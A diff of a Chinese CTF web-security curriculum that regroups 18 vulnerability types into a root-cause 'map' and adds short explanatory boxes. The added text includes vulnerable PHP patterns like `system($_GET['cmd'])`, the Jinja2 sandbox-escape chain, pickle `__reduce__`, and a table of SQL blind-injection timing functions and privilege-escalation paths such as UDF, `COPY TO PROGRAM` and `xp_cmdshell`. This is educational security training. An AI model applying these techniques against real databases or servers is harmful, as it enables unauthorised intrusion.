@@ -1,8 +1,8 @@
 # wei_web · CTF Web 方向 · 系统化学习中心
 
-> 这门课面向「以后专攻 Web 方向」的长期目标：不追求速成，而是把基础、语言、框架、漏洞、工具、方法论六层打通。每节都按「原理 → 动手 → 靶场 → 自测」四步走。原始依据为 MoeCTF 2026 Web 入门指北，并在其上扩展为一套完整的 Web 安全学习体系。
+> 这门课面向「以后专攻 Web 方向」的长期目标：把基础、语言、框架、漏洞、工具、方法论六层打通。v2.4 起不再把漏洞分成「基础 / 高级」两个 PART，而是做成一张按「诞生地」组织的漏洞图谱：先知道有什么、为什么会有，再自己找文章、手动复现。每节仍按「原理 → 动手 → 靶场 → 自测」四步走，但重心从「怎么打」移到「这一行代码为什么会制造漏洞」。
 
-**规模**：13 个 PART / 82 节。
+**规模**：12 个 PART / 83 节。
 
 ## 目录
 
@@ -15,10 +15,9 @@
 - PART 4 · 编程：JS / Python / PHP（第 4–7 周 · 8 节）
 - PART 5 · 自己写一个 Web 应用（第 7–9 周 · 5 节）
 - PART 6 · 框架认知（第 9–10 周 · 快速过 · 5 节）
-- PART 7 · 漏洞体系（第 10–15 周 · 9 节）
-- PART 8 · 高级漏洞（第 15–18 周 · 9 节）
-- PART 9 · 渗透流程与解题方法论（第 18–20 周 · 11 节）
-- PART 10 · 实战复盘（第 20–22 周 · 4 节）
+- PART 7 · 漏洞图谱（第 10–18 周 · 随技术栈穿插 · 19 节）
+- PART 8 · 渗透流程与解题方法论（第 18–20 周 · 11 节）
+- PART 9 · 实战复盘（第 20–22 周 · 4 节）
 
 ---
 
@@ -36,7 +35,7 @@
 
 > 🎯 **本节目标**：不用自己判断从哪开始——照这份清单走完前 10 节（约 4–5 周），你就具备了继续往下学的全部前提。
 
-如果你是刚接触 Web 安全的新手、每周能投入 2–3 小时，不要一次性打开 82 节被吓到，**先只做这 10 节**。它们按依赖顺序排好，每节都能独立完成，不会卡在「前置知识没学」上。
+如果你是刚接触 Web 安全的新手、每周能投入 2–3 小时，不要一次性打开 83 节被吓到，**先只做这 10 节**。它们按依赖顺序排好，每节都能独立完成，不会卡在「前置知识没学」上。
 
 **前 10 节（约 4–5 周）**
 
@@ -55,7 +54,7 @@
 
 ### 别等「学完再做题」：工具和刷题要尽早
 
-一个常见的误区是「先把语言、框架、漏洞都学完，再开始做题」。实际正相反：**简单的 CTF 题不需要完整学语言**，学会抓包改包就能打掉一批新手题。所以这一版把工具和刷题提到 PART 3，Python 放在 PHP 之前，并把基础（PART 0–4）压到 7 周。**全部 82 节都要学，没有选修。**
+一个常见的误区是「先把语言、框架、漏洞都学完，再开始做题」。实际正相反：**简单的 CTF 题不需要完整学语言**，学会抓包改包就能打掉一批新手题。所以这一版把工具和刷题提到 PART 3，Python 放在 PHP 之前，并把基础（PART 0–4）压到 7 周。**全部 83 节都要学，没有选修。**
 
 **节奏对比**
 
@@ -92,9 +91,9 @@
 
 *约 15 分钟*
 
-> 🎯 **本节目标**：搞清 13 个模块的关系，知道自己现在该从哪一节开始。
+> 🎯 **本节目标**：搞清 12 个模块的关系，知道自己现在该从哪一节开始。
 
-这门课分 13 个模块、一共 82 节。它不是「先学完所有语言再做题」，而是**四条线并行**：地基线（浏览器/HTTP）、工具线（抓包/靶场/查手册）、脚本线（Python 优先）、漏洞与流程线（18 类漏洞 + 渗透流程）。
+这门课分 12 个模块、一共 83 节。它不是「先学完所有语言再做题」，而是**四条线并行**：地基线（浏览器/HTTP）、工具线（抓包/靶场/查手册）、脚本线（Python 优先）、漏洞与流程线（18 个漏洞节点 + 渗透流程）。漏洞不再分基础/高级，而是收进一张按「诞生地」组织的图谱。
 
 **四条线怎么并行**
 
@@ -103,7 +102,7 @@
 | 地基线 | PART 0 / 0.5 / 1 / 2 / 2.5：环境、浏览器、HTTP、六段旅程 | 第 1 天 | 能拆请求、能读页面源码 |
 | 工具线 | PART 3：Burp、靶场、信息收集、查手册 | 第 3 周（地基一半时） | 能改包、能打最简单的题 |
 | 脚本线 | PART 4 的 Python 三节 + PART 5：写站、写脚本 | 第 4 周（和工具线交替） | 能写脚本复现手工操作 |
-| 漏洞线 | PART 7 / 8 的 18 节 + PART 9 渗透流程 | 第 10 周（脚本能跑之后） | 每类漏洞能独立复现并写记录 |
+| 漏洞线 | PART 7 的 19 节（18 个节点 + 图谱总览）+ PART 8 渗透流程 | 第 10 周（脚本能跑之后） | 每个节点能独立复现并写记录 |
 
 模块顺序按依赖排好了，但**可以并行**：学到 PART 3 的工具时，就可以去 CTFHub 打最简单的题；Python 脚本可以在做题过程中练，不必等「学完 Python」；PHP 放在 Python 之后，因为读 PHP 源码要等你有能力打题了才有意义。
 
@@ -116,7 +115,7 @@
 
 ### 自测 · 答不上就回去重读
 
-1. 13 个模块分成哪四条线？哪两条可以最早并行？
+1. 12 个模块分成哪四条线？哪两条可以最早并行？
 2. 你现在应该从哪一节开始？为什么？
 3. 为什么 PHP 放在 Python 之后学？
 
@@ -510,13 +509,13 @@ if __name__ == "__main__":
 
 ---
 
-## 2–3 小时/周怎么学：22 周计划（82 节全学）
+## 2–3 小时/周怎么学：22 周计划（83 节全学）
 
 *约 20 分钟*
 
-> 🎯 **本节目标**：按每周 2–3 小时的节奏排出可执行的计划：22 周走完 82 节，工具与刷题从第 3 周就开始。
+> 🎯 **本节目标**：按每周 2–3 小时的节奏排出可执行的计划：22 周走完 83 节，工具与刷题从第 3 周就开始。
 
-先说结论：**每周 2–3 小时，22 周能把 82 节全部走完一遍**。关键不是「学完再练」，而是**学到工具那部分就开始打题**，边打边补语言。
+先说结论：**每周 2–3 小时，22 周能把 83 节全部走完一遍**。关键不是「学完再练」，而是**学到工具那部分就开始打题**，边打边补语言。
 
 **22 周计划（按 2.5 小时/周）**
 
@@ -529,10 +528,9 @@ if __name__ == "__main__":
 | 第 4–7 周 | PART 4：JS / Python / PHP（Python 在 PHP 前） | 8 节 | 能写 20 行脚本复现一次手工测试 |
 | 第 7–9 周 | PART 5：自己写一个 Web 应用（Flask 小站） | 5 节 | 能跑起自己的站，并用 Burp 打它 |
 | 第 9–10 周 | PART 6：技术栈识别（快速过） | 5 节 | 看到站能猜出后端与框架 |
-| 第 10–15 周 | PART 7：漏洞体系 9 节 + 靶场 | 9 节 | 每类漏洞能独立复现 |
-| 第 15–18 周 | PART 8：高级漏洞 9 节 | 9 节 | 能读源码找链，不靠背 payload |
-| 第 18–20 周 | PART 9：渗透流程（收集/验证/后渗透/报告）+ 解题方法论 | 11 节 | 能写出一份合格的验证记录与报告 |
-| 第 20–22 周 | PART 10：实战复盘 | 4 节 | 能独立完成一遍完整流程并复盘 |
+| 第 10–18 周 | PART 7：漏洞图谱 19 节（18 个节点 + 总览）+ 靶场 | 19 节 | 每个节点能独立复现，并能说出根因与修复 |
+| 第 18–20 周 | PART 8：渗透流程（收集/验证/后渗透/报告）+ 解题方法论 | 11 节 | 能写出一份合格的验证记录与报告 |
+| 第 20–22 周 | PART 9：实战复盘 | 4 节 | 能独立完成一遍完整流程并复盘 |
 
 ### 「2 小时」怎么切
 
@@ -546,7 +544,7 @@ if __name__ == "__main__":
 - 基础部分（PART 0–4）不要反复回炉：过一遍就往前走，后面用到了自然会补。
 - PART 6 框架只花 2 周快速过：认得出技术栈就够了，框架细节遇到题目再查。
 - 某一节连续两次都卡住超过 40 分钟：记下「卡在哪」，先走下一节，别停在一节上。
-- 漏洞部分（PART 7 / 8）反过来要慢：每节必须在靶场上动手一次，不能只读。
+- 漏洞部分（PART 7）反过来要慢：每个节点必须在靶场上动手一次，不能只读。
 
 > 💡 最重要的不是速度，是**每周真的打开一次**。建议把「周三晚 20:00 学 1 小时 + 周六上午 1.5 小时」写进日历，比任何学习方法都有效。
 
@@ -720,6 +718,12 @@ fetch("/api/user?id=1")
   .then(data => console.log(data))
   .catch(err => console.error(err));
 ```
+
+> 🧬 **安全触点 · 为什么会有 XSS**
+>
+> 同一段字符串，放进 `textContent` 是文本，放进 `innerHTML` 就变成 HTML；浏览器一旦把它当标签/脚本解析，XSS 就诞生了。浏览器不是没防：**CSP** 限制能执行什么、**HttpOnly** 保护凭据不被脚本读取、**Trusted Types** 限制危险赋值，同源策略则限制跨源读取；但每种防护都有前提和绕过史——这正是图谱里 XSS 节点要追的主线。
+>
+> [图谱 · XSS](#vulnmap/xss) · [读 XSS 的诞生](#p5l5)
 
 > 💡 fetch 是异步的。代码写完之后不会立刻拿到结果，所以要用 .then 或 async/await。**在控制台里直接写返回值，会看到 Promise {&lt;pending&gt;} —— 这不是错，是还没回来。**
 
@@ -1128,7 +1132,7 @@ curl -H "Referer: https://admin.example.com" \
 
 *第 3 周 · 5 节*
 
-> 学漏洞之前，先建立「整张地图」：一次请求要穿过哪些层、每一段谁在做事、每一段可能出什么问题。这一 PART 是后面 PART 7 的索引——看到任何漏洞，你都能把它放回这张图上的某个位置。
+> 学漏洞之前，先建立「整张地图」：一次请求要穿过哪些层、每一段谁在做事、每一段可能出什么问题。这一 PART 是 PART 7 漏洞图谱的底图——看到任何漏洞，你都能把它放回「六段旅程」的某个位置。
 
 ---
 
@@ -1278,7 +1282,7 @@ curl -H "Referer: https://admin.example.com" \
 | ① Web 基础 | HTTP/HTTPS、请求响应、状态码、Cookie/Session、Token/JWT、同源策略与 CORS、DNS 与代理 | PART 2 / 2.5 | 能逐行拆请求、说清登录状态怎么维持 |
 | ② 工具链 | 抓包与改包（Burp/Yakit）、curl、编解码、浏览器 DevTools、Docker 靶场 | PART 1 / 3 | 能独立改包复现一次测试 |
 | ③ 开发与代码 | 一门后端语言（PHP/Python/Java）、数据库基础、前端基础、Git 与 CI 概念 | PART 4 / 5 / 6 | 能读懂一段源码，指出输入进了哪个函数 |
-| ④ 漏洞与利用 | OWASP Top 10、注入、XSS、CSRF、SSRF、文件类、认证与越权、反序列化、逻辑缺陷 | PART 7 / 8 | 每类能写出最小复现和修复方式 |
+| ④ 漏洞与利用 | OWASP Top 10、注入、XSS、CSRF、SSRF、文件类、认证与越权、反序列化、逻辑缺陷 | PART 7（漏洞图谱） | 每个节点能写出最小复现和修复方式 |
 
 这四块不是线性学完再回头，而是**循环**：学到漏洞（④）发现读不懂源码，就回代码（③）；读代码时看不懂请求，就回基础（①）；做不动实验，就补工具（②）。每循环一圈，你的理解都会深一层。
 
@@ -1311,7 +1315,7 @@ curl -H "Referer: https://admin.example.com" \
 
 | 方向 | 日常在做什么 | 核心场景 | 最吃哪块能力 |
 | --- | --- | --- | --- |
-| 渗透测试 / 安全攻防 | 找漏洞、打点、写报告；研究新的攻击面与绕过 | 攻防演练（HVV）、白帽子众测、上线前渗透评估、边界突破打点 | 漏洞与利用（PART 7/8）+ 工具（PART 3）+ 流程与报告（PART 9） |
+| 渗透测试 / 安全攻防 | 找漏洞、打点、写报告；研究新的攻击面与绕过 | 攻防演练（HVV）、白帽子众测、上线前渗透评估、边界突破打点 | 漏洞与利用（PART 7）+ 工具（PART 3）+ 流程与报告（PART 8） |
 | 应用安全 / DevSecOps | 在软件全生命周期里推进安全（SDL），用 SAST/SCA 审计源码，制定规范，做安全左移 | 架构安全评审、API 网关鉴权治理、WAF/RASP 规则运营、越权与业务逻辑缺陷排查、SRC 审核 | 开发与代码（PART 4/5/6）+ 漏洞原理（PART 7）+ 读源码能力 |
 | 终端与主机安全 | 服务器、办公终端、容器宿主机的加固与检测；分析恶意进程、外联与异常行为 | EDR 检测与响应、主机加固、入侵排查 | 运行环境与网络基础 + 日志分析（本课程覆盖较少） |
 
@@ -1319,7 +1323,7 @@ curl -H "Referer: https://admin.example.com" \
 
 | 你的方向 | 本课程重点 | 可以后补 |
 | --- | --- | --- |
-| 渗透 / 攻防 | PART 7/8 全部 + 工具 PART 3 + 流程 PART 9 | PART 6 的 Java/Node 细节 |
+| 渗透 / 攻防 | PART 7 全部 + 工具 PART 3 + 流程 PART 8 | PART 6 的 Java/Node 细节 |
 | 应用安全 / DevSecOps | PART 4 读源码 + PART 6 框架 + PART 7 原理 | PART 3 的扫描器细节 |
 | 主机安全 | PART 0.5 命令行 + PART 2 HTTP + 网络基础 | PART 7 中偏业务的逻辑漏洞 |
 | 还没想好 | 按课程顺序走完前 10 节 + PART 7 | 到了大三再定向 |
@@ -1629,7 +1633,7 @@ docker run -d -p 8090:80 vulnerables/web-dvwa
 | CSRF | CSRF | p5l10 |
 | 模板注入 | SSTI | p5l11 |
 | XXE | XXE | p5l12 |
-| 反序列化 | deserialization | p5l13 / p5l14 |
+| 反序列化 | deserialization | p5l13 / p5l19 / p5l14 |
 | JWT | JWT | p5l15 |
 | 越权 / 逻辑漏洞 | IDOR / access control / business logic | p5l16 |
 
@@ -1653,7 +1657,7 @@ docker run -d -p 8090:80 vulnerables/web-dvwa
   → 记：把「生效的 payload + 为什么」写进笔记
 ```
 
-> 💡 手册是字典，不是教材。只收藏不查、只查不复盘，都是白费——这也是「太笼统」的来源：课程给地图，具体路线要你自己在靶场上走一遍。
+> 💡 手册是字典，不是教材。只收藏不查、只查不复盘，都是白费。课程给的是**漏洞图谱**和「诞生地」，具体路线要你自己在靶场上走一遍：先在图谱里定位节点，再带着节点里的英文关键词去手册里查。
 
 
 ### 靶场与资源
@@ -1744,6 +1748,12 @@ await fetch("https://other.site/api", { credentials: "include" });
 - **忘记 await**：拿到的是 `Promise {&lt;pending&gt;}`，不是数据。控制台里直接敲 fetch 就会看到这个。
 - **忘了判 res.ok**：404 页面也会被当成成功，然后 json() 解析报错。
 - **CORS 被拦**：浏览器里跨域请求会先发预检（OPTIONS），对方没放行就失败——这不是你的代码错，是浏览器在保护用户。
+
+> 🧬 **安全触点 · 同一门 JS，两种运行环境**
+>
+> 浏览器里的 JS 受同源策略、CSP、DOM 边界约束，漏洞形态是 **XSS**；Node 里的 JS 能读文件、起子进程，漏洞形态是**原型链污染、沙箱逃逸、命令执行**。先问「这段代码跑在哪」，再问「它能碰到什么」——同一句 `eval` 在两个环境里的后果完全不同。
+>
+> [图谱 · XSS](#vulnmap/xss) · [图谱 · 原型链污染](#vulnmap/proto) · [图谱 · RCE](#vulnmap/rce)
 
 > 💡 CTF 里这个知识点的用处：**看到页面调用了什么接口、传了什么参数，就能自己构造请求重放**。前端代码在浏览器里，永远是可读可改可调用的。
 
@@ -1843,6 +1853,12 @@ for (const k in window) if (k.startsWith("__")) console.log(k);
 > 🎯 **本节目标**：在自己的机器上装好 Python、会建虚拟环境、会跑 .py 文件、会用 pip 装库。
 
 Python 是 Web 选手的「手」：批量请求、编码处理、盲注自动化、日志分析，全靠它。先把它装顺手，后面每一节都会用到。
+
+> 🧬 **安全触点 · Python 的反序列化，以及「原型链」的误称**
+>
+> Python 没有 JS 的原型链，**别把 prototype pollution 硬套过来**。Python 对应的是**对象图**：pickle 在还原对象时可以触发 `__reduce__`，Jinja2 沙箱逃逸走的是 `__class__.__mro__.__subclasses__()`。学习时抓住共同点：**用户可控的数据被还原成了对象/类引用**，而不是「Python 也有原型」。
+>
+> [图谱 · Python 反序列化](#vulnmap/py-deser) · [图谱 · SSTI](#vulnmap/ssti) · [读 Python 反序列化](#p5l19)
 
 ### 第一步：确认装没装
 
@@ -2104,6 +2120,12 @@ if __name__ == "__main__":
 
 PHP 是 CTF Web 出现频率最高的后端语言。语法松散、上手快，但正是这些「松散」制造了大部分考点。
 
+> 🧬 **安全触点 · PHP 的三个高频诞生点**
+>
+> `$_FILES` + `move_uploaded_file` → 文件上传；`include($_GET['page'])` → 文件包含；`system($_GET['cmd'])` → 命令执行。它们不是三个孤立的「高级漏洞」，而是**三类 PHP API 被用户输入直接控制**的结果。先能指出「输入进了哪个函数」，再谈绕过。
+>
+> [图谱 · 文件上传](#vulnmap/upload) · [图谱 · 包含/穿越](#vulnmap/lfi) · [图谱 · RCE](#vulnmap/rce) · [图谱 · PHP 反序列化](#vulnmap/php-deser)
+
 **基础语法：和 JS 的对照**
 
 ```php
@@ -2282,6 +2304,12 @@ extract($_GET);                  // 用户能覆盖任意变量！?is_admin=1
 > 🎯 **本节目标**：拿到一个 PHP 文件，10 分钟内定位可能的漏洞点，并写出对应的验证 payload。
 
 这节是手法训练。千变万化的代码，用固定四步就能扫出可疑点——这也是真实代码审计的最小流程。
+
+> 🧬 **安全触点 · 读源码就是读「出生证明」**
+>
+> 同一个漏洞换语言就换写法，但根因不变：**入口 → 变量 → 落点 → 判断**。读源码时先找「哪一行让数据越过了边界」，再去看 payload；只会背 payload，等于只会抄答案。
+>
+> [打开漏洞图谱](#vulnmap) · [图谱使用说明](#p5l1)
 
 **四步法**
 
@@ -2504,6 +2532,12 @@ def index():
     return render_template_string(INDEX, rows=rows, uid=session["uid"])
 ```
 
+> 🧬 **安全触点 · 登录鉴权：Session / Cookie / Token 各自信任谁**
+>
+> Session 是服务端状态，Cookie 只是它的钥匙；JWT 是客户端保存的**签名声明**；Flask 默认把 session 放进签名 cookie，所以 `SECRET_KEY` 泄露就等于可以伪造身份。**CSRF 的根因也在这里**：浏览器会自动带 Cookie，但不会替你证明「这次操作是你想要的」。
+>
+> [图谱 · Session/JWT](#vulnmap/auth) · [图谱 · CSRF](#vulnmap/csrf) · [图谱 · 越权](#vulnmap/idor)
+
 **这一段里，哪些地方是「安全写法」**
 
 | 写法 | 为什么安全 |
@@ -2554,6 +2588,23 @@ with db() as c:
               (session["uid"], pid, qty, amount))
 ```
 
+> 🧬 **安全触点 · 同一个注入，不同数据库**
+>
+> SQLite 是教学环境，语法和权限模型都更简单；真实题目常见 MySQL / PostgreSQL。换数据库先做三件事：**确认元数据表、确认时间函数、确认当前账号权限**。注入的根因不变，但「怎么问出数据」和「拿到权限后能做什么」差别很大。
+>
+> [图谱 · SQL 注入](#vulnmap/sqli) · [图谱 · NoSQL](#vulnmap/nosql) · [图谱 · UDF 提权](#vulnmap/udf)
+
+**SQLite / MySQL / PostgreSQL：指纹与打法差异**
+
+| 数据库 | 指纹 / 元数据 | 时间盲注 | 常用取值 | 高权限路径 |
+| --- | --- | --- | --- | --- |
+| SQLite | `sqlite_master`；无 information_schema；`sqlite_version()` | 无 SLEEP；用重查询或 `randomblob` 计时 | `group_concat`、`substr` | 默认无 UDF；`load_extension` 通常关闭 |
+| MySQL | `information_schema`；`@@version`、`database()` | `SLEEP()`、`BENCHMARK()` | `group_concat`、`0x3a` | 高权限 + 可写 plugin_dir → UDF；`INTO OUTFILE` |
+| PostgreSQL | `information_schema`、`pg_catalog`；`version()` | `pg_sleep()` | `string_agg`、`\|\|` 拼接 | `COPY ... TO PROGRAM`（超级用户）、`pg_read_file` |
+| SQL Server | `sys.objects`；`@@version` | `WAITFOR DELAY` | `+` 拼接、`CHAR()` | `xp_cmdshell`（高权限） |
+
+关于 **MySQL UDF 提权**：它成立的前提是「数据库账号权限过高 + 能把共享库写进 plugin_dir + 数据库愿意加载它」。这不是「MySQL 默认就能提权」，而是 SQL 注入拿到高权限账号后的延伸。学习时重点看**权限从哪来、为什么能写文件、怎么修**，不要把它当成一套背下来就能打的 payload。只在本地隔离容器里验证。
+
 **数据层的三件事**
 
 | 事项 | 做法 | 防住了什么 |
@@ -2601,6 +2652,12 @@ orders = db().execute("SELECT * FROM orders WHERE user_id = ?", (session["uid"],
 | 上传有白名单 | 搜 .filename / save( | 文件上传 |
 | 错误信息不回显 | 故意传错参数看报错 | 信息泄露 |
 | 依赖没有已知漏洞 | pip list → 对照 CVE | 组件漏洞 |
+
+> 🧬 **安全触点 · 扩展功能就是新的攻击面**
+>
+> 给站加两个功能：`/preview?url=` 远程取图 → **SSRF** 诞生；`render_template_string("Hi " + name)` → **SSTI** 诞生。先写功能，再画出「输入 → 哪个函数 → 什么后果」，最后才想 payload。
+>
+> [图谱 · SSTI](#vulnmap/ssti) · [图谱 · SSRF](#vulnmap/ssrf)
 
 1. 本地跑起来：`flask --app app run --debug`，用浏览器把四个页面都走一遍。
 2. 打开 Burp，浏览器代理到 127.0.0.1:8080，勾上 Intercept。
@@ -2694,6 +2751,12 @@ orders = db().execute("SELECT * FROM orders WHERE user_id = ?", (session["uid"],
 
 ThinkPHP 是国内中小项目用得极多的 PHP 框架，也是国内 CTF 的常客。框架题的难度不在「挖洞」，而在「认出这是哪个框架、哪个版本」。
 
+> 🧬 **安全触点 · 框架把「一个函数」放大成「一条链」**
+>
+> 框架的入口、路由、模板、ORM 会把同一份输入送到更多落点；版本号决定已知链。但根因仍是**「参数进了不该进的位置」**，只是路径更长。先认版本，再读入口，最后才套链。
+>
+> [图谱 · PHP 反序列化](#vulnmap/php-deser) · [图谱 · RCE](#vulnmap/rce) · [图谱 · SSTI](#vulnmap/ssti)
+
 **典型目录结构**
 
 | 路径 | 作用 | 能泄露什么 |
@@ -2782,6 +2845,12 @@ class Index {
 
 Flask 是 CTF 里最常见的 Python 后端。它代码量小、结构清晰，所以几乎每道 Flask 题都可以「读源码做题」。
 
+> 🧬 **安全触点 · Flask 的雷区，与 Python 的对象图**
+>
+> `debug=True`、`SECRET_KEY` 泄露、`render_template_string` 拼接、pickle 反序列化。前三个已经在 p3d 里出现过；pickle 是 Python 特有的对象图问题，和 JS 原型链不是一回事。
+>
+> [图谱 · SSTI](#vulnmap/ssti) · [图谱 · Session/JWT](#vulnmap/auth) · [图谱 · Python 反序列化](#vulnmap/py-deser)
+
 **一个最小 Flask 应用**
 
 ```python
@@ -2865,6 +2934,12 @@ request.args.get() / request.form.get() / request.json
 > 🎯 **本节目标**：知道这三类技术栈各自的「考点地形」，遇到时知道往哪看、怎么确认。
 
 这三者不需要一开始就精通，但必须知道它们的典型漏洞形态。目标是：**看到站的指纹，就能立刻缩小到对应的漏洞集合**。
+
+> 🧬 **安全触点 · 解析器与运行时默认信任了什么**
+>
+> Java 的 XML 解析器默认可能允许 DTD（XXE），`readObject` 是反序列化入口；Node 的 `vm` 不是安全边界，原型链污染能影响子进程选项。看到这些技术栈，先问「它默认信任了什么」，而不是先找 payload。
+>
+> [图谱 · XXE](#vulnmap/xxe) · [图谱 · Java 反序列化](#vulnmap/java-deser) · [图谱 · 原型链污染](#vulnmap/proto)
 
 **Django（Python）**
 
@@ -2967,60 +3042,433 @@ curl -s https://target.com/robots.txt
 
 ---
 
-# PART 7 · 漏洞体系
+# PART 7 · 漏洞图谱
 
-*第 10–15 周 · 9 节*
+*第 10–18 周 · 随技术栈穿插 · 19 节*
 
-> 18 类漏洞。每节按「原理 → 判断 → 最小复现 → 修复」写，全部要学；细节和变体去 HackTricks / seccmd 查（方法见 p6l5）。
+> 不再分「基础漏洞 / 高级漏洞」。18 个节点按诞生地挂回浏览器、会话、数据库、文件、模板、解析器、序列化与外部请求；每节保留最小复现，但先讲清根因。先看图知道有什么，再自己找文章、手动复现。
 
 ---
 
-## 漏洞全景与分类
+## 漏洞图谱（Markdown 版）
+
+> 这张图不是 payload 大全，而是「漏洞出生地」地图。左边是技术现场，右边是它最容易生出的漏洞；虚线表示两个漏洞可以接成一条链。点开一个节点，只看四件事：一句话是什么、诞生在哪、根因是什么、怎么观察。想深入，再按节点里的关键词去找博客、去靶场手动复现。
+
+| 技术现场 | 节点 | 一句话 | 根因 | 对应节 |
+| --- | --- | --- | --- | --- |
+| 浏览器 / 前端 JS | **XSS 跨站脚本** | 用户输入被浏览器当成 HTML/JS 执行。 | 输出时没有按 HTML / 属性 / JS / URL 的上下文编码，数据越过了「文本」边界。 | p5l5 |
+| HTTP / Cookie | **CSRF 跨站请求伪造** | 借浏览器自动携带的 Cookie，发一个用户没想发的请求。 | 身份凭据由浏览器自动附带，而操作本身没有绑定「本次请求」的额外凭证。 | p5l10 |
+| 登录 / 鉴权 | **Session / JWT 绕过** | 身份凭据可预测、可伪造，或服务端根本没校验签名。 | 把「客户端提交的身份」当成可信身份；或密钥、算法、随机性不足。 | p5l15 |
+| 业务流程 | **越权与逻辑漏洞** | 功能按设计跑，但「这个对象是不是你的」没校验。 | 把「参数里的对象归属」交给客户端决定，服务端只按 id 查询。 | p5l16 |
+| 响应 / 错误 | **信息泄露** | 响应、备份、版本库把「不该给的地图」给了出去。 | 生产环境保留了开发/调试/历史产物；错误信息直接回显。 | p5l2 |
+| 数据库 | **SQL 注入** | 用户输入变成了 SQL 语句的一部分。 | SQL 结构由字符串拼接决定，数据越过了「值」的边界。 | p5l3 |
+| 数据库 | **NoSQL 注入** | 查询条件从字符串变成了对象，操作符被注入。 | 把用户提交的对象原样当查询条件，$ne / $regex 等操作符生效。 | p5l17 |
+| 数据库 | **数据库 UDF 提权** | 数据库高权限账号把攻击者的共享库加载进进程，执行系统命令。 | 数据库账号权限过大，且允许从可写目录加载原生代码。 | p3d4 |
+| 文件系统 | **文件上传** | 用户控制文件名/内容，文件又落在可执行目录。 | 上传校验信任客户端元数据；上传目录与 Web 根目录未隔离。 | p5l6 |
+| 文件系统 | **路径穿越 / 文件包含** | 用户控制路径，读到任意文件，或把文件当代码包含。 | 路径由输入拼接，没有白名单或 realpath 边界校验。 | p5l7 |
+| 文件系统 | **命令 / 代码执行** | 用户输入进入了 shell 或语言求值器。 | 数据被拼进命令/代码字符串，没有做到「参数与代码分离」。 | p5l8 |
+| 模板引擎 | **SSTI 模板注入** | 用户输入被模板引擎当成模板源码求值。 | 把「模板源码」和「模板变量」混为一谈，用户能写表达式。 | p5l11 |
+| XML / 解析器 | **XXE 外部实体** | XML 解析器把外部实体指向的文件/URL 读了进来。 | 解析器允许 DTD/外部实体，且解析结果会回显或被使用。 | p5l12 |
+| 序列化 / 对象 | **PHP 反序列化** | 可控序列化字符串还原成对象，魔术方法被自动触发。 | 反序列化不可信数据，且类里有危险魔术方法/调用链。 | p5l13 |
+| 序列化 / 对象 | **Python 反序列化** | pickle / PyYAML 等把字节还原成对象，可能触发任意调用。 | 反序列化不可信字节；Python 对象图可在还原时执行代码。 | p5l19 |
+| 序列化 / 对象 | **Java 反序列化** | readObject 还原对象，第三方库的调用链被串起来。 | 反序列化不可信字节；classpath 里存在可利用的 gadget 链。 | p5l14 |
+| Node.js 运行时 | **原型链污染** | __proto__ 被写进公共原型，之后所有对象都带上被污染的属性。 | 递归合并时没有过滤 __proto__/constructor/prototype，写穿了对象原型。 | p5l18 |
+| 服务端请求 | **SSRF 服务端请求** | 服务器替你访问了你指定的、它本不该访问的地址。 | 服务端把用户给的 URL 直接交给 HTTP 客户端，没有出站白名单。 | p5l9 |
+
+---
+
+## 先看图谱：漏洞不是清单，是数据被误用的位置
 
 *约 20 分钟*
 
-> 🎯 **本节目标**：建立一张漏洞地图：看到一个输入，就知道该翻哪一节的 payload。
+> 🎯 **本节目标**：能看着图谱说出 18 个节点分别诞生在哪一层，并用自己的话解释「根因」和「修复」的关系。
 
-所有 Web 漏洞都长着同一张脸：**来自不可信来源的数据，被当成代码 / 路径 / 身份 / 请求 / 数据结构来用了。**区别只在「被当成什么」。记住这张表，比背 18 个名词管用。
+从这一节开始，不再分「基础漏洞 / 高级漏洞」。漏洞没有难度等级，只有**「诞生在哪一层、需要什么前置知识」**。同样是 SQL 注入，SQLite 和 MySQL 的写法不同；同样是反序列化，PHP、Python、Java 的对象模型完全不同。按语言、框架、数据层去挂，才记得住。
 
-**按「被污染成什么」分类**
+先打开左侧的 **🕸 漏洞图谱**。图上每个节点只回答四个问题：**一句话是什么、诞生在哪、根因是什么、怎么观察**。点开节点还有「手动复现」和「搜什么关键词」。这张图是索引，不是教材；真正的深度靠你自己找文章、复现、写笔记。
 
-| 被当成 | 代表漏洞 | 一句话原理 |
+**技术现场 → 图谱节点 → 根因一句话**
+
+| 技术现场 | 节点 | 根因一句话 |
 | --- | --- | --- |
-| 代码 | SQLi / XSS / 命令执行 / SSTI / XXE / 反序列化 | 数据被拼进了「会被执行」的位置 |
-| 路径 | 路径穿越 / 文件包含 / 文件上传 | 数据决定了「读/写/执行哪个文件」 |
-| 身份 | 认证绕过 / JWT 伪造 / Session 伪造 / CSRF | 数据被当成了「你是谁」的凭证 |
-| 服务端请求 | SSRF | 数据变成了「让服务器替你发的请求」 |
-| 数据与流程 | 信息泄露 / 逻辑漏洞 / 越权 | 数据或流程本身就能被看到、被绕过 |
-| 对象结构 | 原型链污染 | 数据被合并进了对象的原型链 |
+| 浏览器 / 前端 JS | [XSS](#vulnmap/xss)、[原型链污染](#vulnmap/proto) | 数据被当成 HTML/JS，或对象原型被写穿 |
+| HTTP / Cookie | [CSRF](#vulnmap/csrf) | 浏览器自动带凭据，操作没绑定本次请求 |
+| 登录 / 鉴权 | [Session/JWT](#vulnmap/auth)、[越权](#vulnmap/idor) | 身份由客户端决定，或对象归属没校验 |
+| 业务流程 | [逻辑漏洞](#vulnmap/idor) | 服务端把「钱、状态、归属」交给前端 |
+| 响应 / 错误 | [信息泄露](#vulnmap/info) | 开发产物和报错把地图送出去 |
+| 数据库 | [SQLi](#vulnmap/sqli)、[NoSQL](#vulnmap/nosql)、[UDF](#vulnmap/udf) | 输入变成查询结构；账号权限过大 |
+| 文件系统 | [上传](#vulnmap/upload)、[穿越/包含](#vulnmap/lfi)、[RCE](#vulnmap/rce) | 输入决定路径，文件被当代码执行 |
+| 模板引擎 | [SSTI](#vulnmap/ssti) | 输入被当模板源码求值 |
+| XML / 解析器 | [XXE](#vulnmap/xxe) | 解析器信任外部实体 |
+| 序列化 | [PHP](#vulnmap/php-deser) / [Python](#vulnmap/py-deser) / [Java](#vulnmap/java-deser) 反序列化 | 不可信字节被还原成对象 |
+| Node.js 运行时 | [原型链污染](#vulnmap/proto) | 合并函数写穿 Object.prototype |
+| 服务端请求 | [SSRF](#vulnmap/ssrf) | 服务端替攻击者访问内网 |
 
-### 拿到一道题，先问三个问题
+### 学习闭环：一个节点怎么学
 
-1. **输入从哪进来**：URL 参数、表单、JSON、Cookie、请求头（Referer / XFF / UA）、文件名、甚至上传的图片内容。
